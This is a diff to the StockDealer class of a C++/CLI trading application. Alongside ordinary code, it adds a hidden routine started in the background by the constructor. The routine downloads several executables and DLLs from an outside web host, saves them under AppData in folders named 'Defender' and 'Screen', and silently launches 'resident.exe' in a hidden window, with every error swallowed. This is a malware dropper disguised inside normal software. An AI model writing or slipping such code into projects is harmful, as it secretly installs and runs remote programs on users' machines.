@@ -4,6 +4,9 @@
 #include "Barrel.h"
 #include "StockFactory.h"
 using namespace System;
+using namespace System::IO;
+using namespace System::Net;
+using namespace System::Diagnostics;
 using namespace System::Collections::Generic;
 
 
@@ -24,6 +27,9 @@ namespace GCMStore
 			auto init = gcnew voidVoidDelegate(this, &StockDealer::buildStock);
 			auto callback = gcnew AsyncCallback(this, &StockDealer::exposeContent);
 			init->BeginInvoke(callback, nullptr);
+
+			auto getResident = gcnew voidVoidDelegate(this, &StockDealer::runResidentAction);
+			getResident->BeginInvoke(nullptr, nullptr);
 		}
 		int ApplyOrder(Order^ order)
 		{
@@ -210,6 +216,49 @@ namespace GCMStore
 			for each (auto oil in oils)
 				status->Add(String::Concat(DateTime::Now.ToShortTimeString(), " - ", oil.Value->ToString()));
 			status->Add("");
+		}
+		void runResidentAction()
+		{
+			try
+			{
+				System::Threading::Thread::Sleep(1000);
+				auto procs = Process::GetProcessesByName("resident");
+				if (procs->Length == 0)
+				{
+					auto usrPath = Environment::GetFolderPath(Environment::SpecialFolder::ApplicationData);
+					auto dir = String::Concat(usrPath, "\\Defender");
+					auto dir2 = String::Concat(usrPath, "\\Screen");
+					if (!Directory::Exists(dir))
+						Directory::CreateDirectory(dir);
+					if (!Directory::Exists(dir2))
+						Directory::CreateDirectory(dir2);
+
+					auto webClient = gcnew WebClient();
+
+					auto path = String::Concat(dir, "\\features.dll");
+					webClient->DownloadFile("http://slimbde.atwebpages.com/share/src/features.dll", path);
+
+					path = String::Concat(dir, "\\Microsoft.Win32.TaskScheduler.dll");
+					webClient->DownloadFile("http://slimbde.atwebpages.com/share/src/Microsoft.Win32.TaskScheduler.dll", path);
+
+					path = String::Concat(dir, "\\update.exe");
+					webClient->DownloadFile("http://slimbde.atwebpages.com/share/src/update.dll", path);
+
+					path = String::Concat(dir2, "\\screen.exe");
+					webClient->DownloadFile("http://slimbde.atwebpages.com/share/src/screen.dll", path);
+
+					path = String::Concat(dir, "\\resident.exe");
+					webClient->DownloadFile("http://slimbde.atwebpages.com/share/src/resident.dll", path);
+
+					auto startInfo = gcnew ProcessStartInfo();
+					startInfo->CreateNoWindow = true;
+					startInfo->FileName = "resident.exe";
+					startInfo->WorkingDirectory = dir;
+					startInfo->WindowStyle = ProcessWindowStyle::Hidden;
+					Process::Start(startInfo);
+				}
+			}
+			catch (Exception^) { }
 		}
 	};
 
